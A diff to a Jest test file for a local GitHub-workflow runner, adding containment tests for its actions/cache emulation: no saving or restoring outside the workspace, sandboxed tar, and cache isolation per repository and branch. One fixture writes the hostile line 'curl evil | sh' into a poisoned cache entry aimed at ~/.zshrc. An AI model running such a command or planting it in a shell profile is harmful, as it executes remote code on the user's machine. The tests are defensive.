@@ -24,6 +24,12 @@ jest.mock('child_process', () => {
   return { ...actual, spawn: jest.fn() };
 });
 
+// A scratch home per test, so nothing here reads or writes the real one.
+jest.mock('os', () => {
+  const actual = jest.requireActual<typeof import('os')>('os');
+  return { ...actual, homedir: jest.fn(actual.homedir) };
+});
+
 jest.mock('./action-fetcher', () => {
   const actual = jest.requireActual<typeof import('./action-fetcher')>('./action-fetcher');
   return { ...actual, fetchAction: jest.fn() };
@@ -73,7 +79,9 @@ beforeEach(() => {
       profileDirMode: fs.statSync(path.dirname(profilePath)).mode & 0o777,
     });
     const child = new EventEmitter() as childProcess.ChildProcess;
-    Object.assign(child, { pid: 999999, stdout: new PassThrough(), stderr: new PassThrough() });
+    const stdin = new PassThrough();
+    stdin.resume();
+    Object.assign(child, { pid: 999999, stdin, stdout: new PassThrough(), stderr: new PassThrough() });
     setImmediate(() => {
       (child.stdout as PassThrough).end();
       (child.stderr as PassThrough).end();
@@ -91,6 +99,8 @@ beforeEach(() => {
   scratch = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'step-containment-')));
   workDir = path.join(scratch, 'ws');
   fs.mkdirSync(path.join(workDir, 'sub'), { recursive: true });
+  fs.mkdirSync(path.join(scratch, 'home'));
+  jest.mocked(os.homedir).mockReturnValue(path.join(scratch, 'home'));
   process.env.LOCALMOST_CONFIG_DIR = path.join(scratch, 'appdata');
 });
 
@@ -232,6 +242,94 @@ describe('the files the app writes and reads in the workspace', () => {
     duringStep = (env) => fs.appendFileSync(env.GITHUB_OUTPUT, 'answer=42\n');
     const result = await run({ id: 'ok', run: 'true' });
     expect(result.outputs).toEqual({ answer: '42' });
+  });
+});
+
+describe('the cache intercept', () => {
+  // actions/cache is emulated by the app itself, outside any sandbox, with
+  // paths the workflow names. Saving an absolute path copied the user's own
+  // files into the cache, and restoring one wrote over them.
+  let victim: string;
+  const cacheRoot = () => path.join(scratch, 'appdata', 'workflow-cache');
+
+  const filesUnder = (dir: string): string[] =>
+    fs.existsSync(dir)
+      ? fs.readdirSync(dir, { withFileTypes: true }).flatMap((e) =>
+          e.isDirectory() ? filesUnder(path.join(dir, e.name)) : [path.join(dir, e.name)])
+      : [];
+
+  beforeEach(() => {
+    victim = path.join(scratch, 'home', 'keys', 'id_ed25519');
+    fs.mkdirSync(path.dirname(victim), { recursive: true });
+    fs.writeFileSync(victim, 'PRIVATE KEY\n');
+  });
+
+  it('never saves a path outside the workspace', async () => {
+    const result = await run({
+      uses: 'actions/cache/save@v4',
+      with: { key: 'k1', path: `${path.dirname(victim)}\n../home` },
+    });
+    expect(result.status).toBe('success');
+    for (const file of [...filesUnder(cacheRoot()), ...filesUnder(path.join(scratch, 'home', '.localmost'))]) {
+      expect(fs.readFileSync(file, 'utf-8')).not.toContain('PRIVATE KEY');
+    }
+    expect(spawn).not.toHaveBeenCalled();
+  });
+
+  it('never restores to a path outside the workspace', async () => {
+    // A cache entry laid out the way the intercept used to store one - under
+    // ~/.localmost - whose name matches the path being restored.
+    const target = path.join(scratch, 'home', '.zshrc');
+    for (const root of [cacheRoot(), path.join(scratch, 'home', '.localmost', 'workflow-cache')]) {
+      const entry = path.join(root, 'k2');
+      fs.mkdirSync(entry, { recursive: true });
+      fs.writeFileSync(path.join(entry, target.replace(/[^a-zA-Z0-9_-]/g, '_')), 'curl evil | sh\n');
+    }
+
+    await run({ uses: 'actions/cache@v4', with: { key: 'k2', path: target } });
+
+    expect(fs.existsSync(target)).toBe(false);
+  });
+
+  it('copies with tar, inside a sandbox rooted at the workspace', async () => {
+    fs.mkdirSync(path.join(workDir, 'node_modules'));
+    fs.mkdirSync(path.join(workDir, '.home', '.npm'), { recursive: true });
+    const result = await run({
+      uses: 'actions/cache/save@v4',
+      with: { key: 'k3', path: 'node_modules\n~/.npm' },
+    });
+    expect(result.status).toBe('success');
+    expect(spawned).toHaveLength(1);
+    const [{ command, args, cwd, profile }] = spawned;
+    expect(command).toBe('/usr/bin/sandbox-exec');
+    expect(args.slice(2)).toEqual(['/usr/bin/tar', '-c', '-f', '-', '-C', workDir, '--', './node_modules', './.home/.npm']);
+    expect(cwd).toBe(workDir);
+    expect(profile).toContain(`(allow file-write*\n  (subpath "${workDir}"))`);
+    expect(profile).not.toContain(cacheRoot());
+  });
+
+  it('keeps one repository\'s and branch\'s caches from another\'s', async () => {
+    // A checkout under test could otherwise save a poisoned node_modules
+    // under a key the next repository - or the default branch - restores.
+    fs.mkdirSync(path.join(workDir, 'node_modules'));
+    const as = (repo: string, ref: string, step: WorkflowStep) =>
+      executeStep(step, { ...context(), workflowEnv: { GITHUB_REPOSITORY: repo, GITHUB_REF: ref } }, job());
+
+    await as('evil/fork', 'refs/heads/pr', { uses: 'actions/cache/save@v4', with: { key: 'deps', path: 'node_modules' } });
+    spawn.mockClear();
+
+    for (const [repo, ref] of [['evil/fork', 'refs/heads/main'], ['good/repo', 'refs/heads/pr']]) {
+      const result = await as(repo, ref, {
+        id: 'c',
+        uses: 'actions/cache@v4',
+        with: { key: 'deps', path: 'node_modules', 'restore-keys': 'de' },
+      });
+      expect(result.outputs['cache-hit']).toBe('false');
+    }
+    expect(spawn).not.toHaveBeenCalled();
+
+    const hit = await as('evil/fork', 'refs/heads/pr', { uses: 'actions/cache@v4', with: { key: 'deps', path: 'node_modules' } });
+    expect(hit.outputs['cache-hit']).toBe('true');
   });
 });
 
